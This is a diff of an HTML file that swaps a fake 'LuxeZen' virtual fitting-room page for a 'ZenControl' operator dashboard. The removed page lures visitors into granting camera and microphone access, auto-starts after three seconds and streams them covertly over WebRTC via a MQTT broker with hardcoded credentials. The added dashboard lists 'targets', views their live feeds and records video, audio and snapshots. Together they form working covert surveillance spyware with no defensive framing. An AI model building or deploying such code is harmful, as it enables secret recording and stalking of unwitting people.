@@ -3,119 +3,156 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LuxeZen | Exclusive Preview</title>
+    <title>ZenControl • Dashboard</title>
     <style>
         body {
             margin: 0;
-            padding: 0;
-            background: #0a0a0a;
-            color: #fff;
-            font-family: 'Segoe UI', sans-serif;
-            overflow-x: hidden;
+            background: #111;
+            color: #0af;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
         }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 40px 20px;
-            text-align: center;
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #0af;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
         }
         .logo {
-            font-size: 2.5rem;
-            font-weight: 300;
-            letter-spacing: 8px;
-            color: #d4af37;
-            margin-bottom: 10px;
-        }
-        .tagline {
-            font-size: 1rem;
-            color: #aaa;
-            margin-bottom: 50px;
-        }
-        .main-btn {
-            background: linear-gradient(135deg, #d4af37, #f7ef8a);
-            border: none;
-            padding: 22px 50px;
-            font-size: 1.3rem;
-            color: #000;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
+            font-size: 1.8rem;
             font-weight: bold;
-            letter-spacing: 2px;
-            margin-top: 30px;
+            color: #0af;
         }
-        .main-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 30px rgba(212, 175, 55, 0.7);
+        .status {
+            background: #222;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 0.9rem;
         }
-        .loading {
-            display: none;
-            margin-top: 30px;
-            color: #d4af37;
-        }
-        .footer {
-            margin-top: 80px;
-            color: #555;
-            font-size: 0.8rem;
-        }
-        .hidden {
-            display: none;
-        }
-        #video {
-            width: 100%;
-            max-width: 400px;
+        .online { color: #0f0; }
+        .offline { color: #f00; }
+        .container { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
+        .feed-container {
+            background: #000;
+            border: 2px solid #0af;
             border-radius: 10px;
-            margin-top: 20px;
-            border: 2px solid #d4af37;
+            padding: 15px;
+            text-align: center;
         }
+        #remoteVideo {
+            width: 100%;
+            max-height: 500px;
+            border-radius: 5px;
+            background: #000;
+        }
+        .controls {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 10px;
+        }
+        .btn {
+            background: #0af;
+            color: #000;
+            border: none;
+            padding: 12px 20px;
+            margin: 5px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+        }
+        .btn:hover { background: #0cf; }
+        .btn.rec { background: #f00; }
+        .log {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 15px;
+            height: 300px;
+            overflow-y: auto;
+            font-size: 0.8rem;
+            margin-top: 20px;
+        }
+        .log-entry {
+            margin-bottom: 8px;
+            padding-bottom: 8px;
+            border-bottom: 1px dashed #333;
+        }
+        .target-list { margin-top: 20px; }
+        .target-item {
+            padding: 10px;
+            background: #222;
+            margin: 5px 0;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .target-item:hover { background: #333; }
     </style>
 </head>
 <body>
+    <div class="header">
+        <div class="logo">ZENCONTROL DASHBOARD</div>
+        <div class="status" id="status">🔴 OFFLINE</div>
+    </div>
+
     <div class="container">
-        <div class="logo">LUXEZEN</div>
-        <div class="tagline">EXCLUSIVE DIGITAL FITTING ROOM — PRIVATE PREVIEW</div>
-        <p>Experience the future of fashion tailoring. Our AI will analyze your profile to curate a personalized collection.</p>
-        <p><em>Please allow camera access for body measurement scanning.</em></p>
-        
-        <button class="main-btn" id="startBtn">🎀 LAUNCH VIRTUAL FITTING</button>
-        
-        <div class="loading" id="loading">
-            Initializing scanning environment... <br>
-            <small>Do not close this window.</small>
+        <div class="feed-container">
+            <h3>📡 LIVE FEED - <span id="currentTarget">No target</span></h3>
+            <video id="remoteVideo" autoplay playsinline></video>
+            <div style="margin-top: 15px;">
+                <button class="btn rec" id="recBtn">● START RECORDING</button>
+                <button class="btn" id="snapBtn">📸 CAPTURE FRAME</button>
+                <button class="btn" id="audioBtn">🎤 TOGGLE AUDIO</button>
+                <button class="btn" id="disconnectBtn">⚠️ DISCONNECT</button>
+            </div>
         </div>
 
-        <video id="video" autoplay playsinline></video>
-
-        <div class="footer">
-            <p>© 2025 LuxeZen Collective. This is a private preview session.<br>
-            <span id="sessionId">Session ID: Loading...</span></p>
+        <div class="controls">
+            <h3>⚙️ ACTIVE TARGETS</h3>
+            <div class="target-list" id="targetList">
+                <div class="target-item" style="color:#777">Waiting for connections...</div>
+            </div>
+            
+            <h3 style="margin-top:30px;">📊 LOGS</h3>
+            <div class="log" id="log">
+                <div class="log-entry">[<span id="time">00:00:00</span>] Dashboard initialized.</div>
+            </div>
         </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/simple-peer@9.11.1/simplepeer.min.js"></script>
     <script>
-        const startBtn = document.getElementById('startBtn');
-        const loading = document.getElementById('loading');
-        const video = document.getElementById('video');
-        const sessionIdEl = document.getElementById('sessionId');
-
-        // Generate session ID
-        const sessionId = 'TARGET_' + Math.random().toString(36).substring(2, 10).toUpperCase();
-        sessionIdEl.innerText = `Session ID: ${sessionId}`;
+        const remoteVideo = document.getElementById('remoteVideo');
+        const statusEl = document.getElementById('status');
+        const logEl = document.getElementById('log');
+        const targetList = document.getElementById('targetList');
+        const currentTargetEl = document.getElementById('currentTarget');
+        const recBtn = document.getElementById('recBtn');
+        const snapBtn = document.getElementById('snapBtn');
+        const audioBtn = document.getElementById('audioBtn');
+        const disconnectBtn = document.getElementById('disconnectBtn');
 
         let peer = null;
-        let stream = null;
-        let mqttClient = null;
+        let currentSessionId = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let audioEnabled = true;
+        const activeTargets = new Map();
 
-        // HiveMQ WebSocket connection
+        // HiveMQ Connection
         const ws = new WebSocket('wss://aa3c606196d945bc89c194f94dc418b5.a1.au.hivema.cloud:8884/mqtt');
 
         ws.onopen = () => {
-            console.log('Connected to HiveMQ');
-            // Subscribe ke channel sendiri untuk menerima signal dari dashboard
+            log('Connected to HiveMQ Cloud');
+            statusEl.innerHTML = '🟢 HIVEMQ CONNECTED';
+            statusEl.className = 'status online';
+            
+            // Subscribe ke semua signal dari target
             ws.send(JSON.stringify({
                 cmd: 'subscribe',
-                topics: [`spy/${sessionId}/signal`],
+                topics: ['spy/DASHBOARD/signal'],
                 username: 'Zang',
                 password: 'ZingZangRulez'
             }));
@@ -123,63 +160,165 @@
 
         ws.onmessage = (event) => {
             const msg = JSON.parse(event.data);
-            if (msg.topic === `spy/${sessionId}/signal` && peer) {
+            
+            if (msg.topic === 'spy/DASHBOARD/signal') {
                 const data = JSON.parse(msg.payload);
-                peer.signal(data);
+                const { sessionId, signal } = data;
+                
+                if (!activeTargets.has(sessionId)) {
+                    // New target detected
+                    addTarget(sessionId);
+                }
+                
+                // Jika target ini sedang dipilih, process signal
+                if (sessionId === currentSessionId && peer) {
+                    peer.signal(signal);
+                }
+                
+                // Auto-connect ke target pertama jika belum ada koneksi
+                if (!currentSessionId && activeTargets.size === 1) {
+                    selectTarget(sessionId);
+                }
             }
         };
 
-        startBtn.onclick = async () => {
-            startBtn.style.display = 'none';
-            loading.style.display = 'block';
+        function addTarget(sessionId) {
+            activeTargets.set(sessionId, { connected: false });
+            
+            const targetItem = document.createElement('div');
+            targetItem.className = 'target-item';
+            targetItem.innerHTML = `📱 ${sessionId} <span style="float:right; color:#0f0">● LIVE</span>`;
+            targetItem.onclick = () => selectTarget(sessionId);
+            
+            targetList.appendChild(targetItem);
+            log(`New target detected: ${sessionId}`);
+        }
 
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                video.srcObject = stream;
-                video.classList.remove('hidden');
+        function selectTarget(sessionId) {
+            if (peer) peer.destroy();
+            
+            currentSessionId = sessionId;
+            currentTargetEl.textContent = sessionId;
+            
+            // Update UI
+            document.querySelectorAll('.target-item').forEach(item => {
+                item.style.background = item.textContent.includes(sessionId) ? '#0af' : '#222';
+                item.style.color = item.textContent.includes(sessionId) ? '#000' : '#0af';
+            });
+            
+            // Create new peer connection
+            peer = new SimplePeer({
+                initiator: false,
+                config: {
+                    iceServers: [
+                        { urls: 'stun:stun.l.google.com:19302' },
+                        { urls: 'stun:global.stun.twilio.com:3478' }
+                    ]
+                }
+            });
 
-                // Create peer connection
-                peer = new SimplePeer({
-                    initiator: true,
-                    stream: stream,
-                    config: {
-                        iceServers: [
-                            { urls: 'stun:stun.l.google.com:19302' },
-                            { urls: 'stun:global.stun.twilio.com:3478' }
-                        ]
-                    }
-                });
+            peer.on('signal', data => {
+                // Kirim balik ke target
+                ws.send(JSON.stringify({
+                    cmd: 'publish',
+                    topic: `spy/${sessionId}/signal`,
+                    payload: JSON.stringify(data),
+                    username: 'Zang',
+                    password: 'ZingZangRulez'
+                }));
+            });
 
-                peer.on('signal', data => {
-                    // Kirim signal ke channel dashboard
-                    ws.send(JSON.stringify({
-                        cmd: 'publish',
-                        topic: 'spy/DASHBOARD/signal',
-                        payload: JSON.stringify({
-                            sessionId: sessionId,
-                            signal: data
-                        }),
-                        username: 'Zang',
-                        password: 'ZingZangRulez'
-                    }));
-                });
+            peer.on('stream', stream => {
+                remoteVideo.srcObject = stream;
+                log(`Stream active from ${sessionId}`);
+                statusEl.innerHTML = `🎯 ${sessionId} - LIVE`;
+            });
 
-                peer.on('connect', () => {
-                    console.log('PEER CONNECTED - Stream active');
-                    loading.innerHTML = 'Scanning in progress...<br>You may minimize this window.';
-                });
+            peer.on('close', () => {
+                log(`Target ${sessionId} disconnected.`);
+                statusEl.innerHTML = '🔴 TARGET OFFLINE';
+            });
+            
+            log(`Connecting to ${sessionId}...`);
+        }
 
-                console.log('Spy stream started.');
-            } catch (err) {
-                console.error('Error:', err);
-                loading.innerHTML = 'Camera access required.<br>Please refresh and allow.';
+        // Control functions
+        recBtn.onclick = () => {
+            if (!mediaRecorder) {
+                const stream = remoteVideo.srcObject;
+                if (!stream) return alert('No active stream');
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `spy-record-${Date.now()}.webm`;
+                    a.click();
+                };
+                mediaRecorder.start();
+                recBtn.textContent = '⏹ STOP RECORDING';
+                log('Recording started.');
+            } else {
+                mediaRecorder.stop();
+                mediaRecorder = null;
+                recordedChunks = [];
+                recBtn.textContent = '● START RECORDING';
+                log('Recording saved.');
             }
         };
 
-        // Auto-start setelah 3 detik (opsional, biar lebih natural)
-        setTimeout(() => {
-            startBtn.click();
-        }, 3000);
+        snapBtn.onclick = () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = remoteVideo.videoWidth;
+            canvas.height = remoteVideo.videoHeight;
+            canvas.getContext('2d').drawImage(remoteVideo, 0, 0);
+            const link = document.createElement('a');
+            link.download = `snap-${Date.now()}.png`;
+            link.href = canvas.toDataURL();
+            link.click();
+            log('Screenshot captured.');
+        };
+
+        audioBtn.onclick = () => {
+            if (remoteVideo.srcObject) {
+                const audioTracks = remoteVideo.srcObject.getAudioTracks();
+                audioTracks.forEach(track => {
+                    track.enabled = !track.enabled;
+                });
+                audioEnabled = !audioEnabled;
+                audioBtn.textContent = audioEnabled ? '🎤 AUDIO ON' : '🔇 AUDIO OFF';
+                log(`Audio ${audioEnabled ? 'enabled' : 'disabled'}`);
+            }
+        };
+
+        disconnectBtn.onclick = () => {
+            if (peer) {
+                peer.destroy();
+                peer = null;
+                remoteVideo.srcObject = null;
+                currentSessionId = null;
+                currentTargetEl.textContent = 'No target';
+                statusEl.innerHTML = '🟢 READY';
+                log('Disconnected from target.');
+            }
+        };
+
+        function log(text) {
+            const now = new Date();
+            const time = now.toTimeString().split(' ')[0];
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `[${time}] ${text}`;
+            logEl.appendChild(entry);
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+
+        // Update time
+        setInterval(() => {
+            document.getElementById('time').textContent = new Date().toTimeString().split(' ')[0];
+        }, 1000);
     </script>
 </body>
     </html>
